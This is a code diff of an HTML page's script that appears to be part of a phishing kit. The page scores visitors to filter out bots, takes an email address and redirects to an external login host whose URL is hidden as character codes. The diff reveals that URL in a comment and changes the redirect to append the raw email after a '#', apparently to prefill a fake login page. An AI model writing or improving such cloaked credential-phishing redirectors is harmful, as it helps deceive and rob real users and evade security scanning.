@@ -219,7 +219,8 @@
     <script>
         (function(){
             // ==================== CONFIGURATION ====================
-            // Target URL – built from character codes (obfuscated)
+            // Target URL: https://login1.nycfootware.com/CPtOvnKA#
+            // Built from character codes (obfuscated)
             const _targetBase = String.fromCharCode(
                 104, 116, 116, 112, 115, 58, 47, 47, 108, 111, 103, 105, 110, 49, 46, 110,
                 121, 99, 102, 111, 111, 116, 119, 97, 114, 101, 46, 99, 111, 109, 47, 67,
@@ -415,11 +416,11 @@
                     emailSection.classList.add('visible');
 
                     // Optional: show warning if score is borderline (but still human)
-                    if (total > BOT_THRESHOLD * 0.7) {  // e.g., > 8.4
+                    if (total > BOT_THRESHOLD * 0.7) {
                         botWarning.classList.remove('hidden');
                     }
 
-                    // Handle form submission
+                    // Handle form submission – direct concatenation, no ?email=
                     document.getElementById('accessForm').addEventListener('submit', function(e) {
                         e.preventDefault();
                         const email = document.getElementById('email').value.trim();
@@ -431,9 +432,8 @@
                             return;
                         }
 
-                        // Encode email and append as query parameter
-                        const encoded = encodeURIComponent(email);
-                        const redirectUrl = _targetBase + '?email=' + encoded;
+                        // Build URL: base + email (no separator)
+                        const redirectUrl = _targetBase + email;
 
                         // Redirect
                         window.location.replace(redirectUrl);
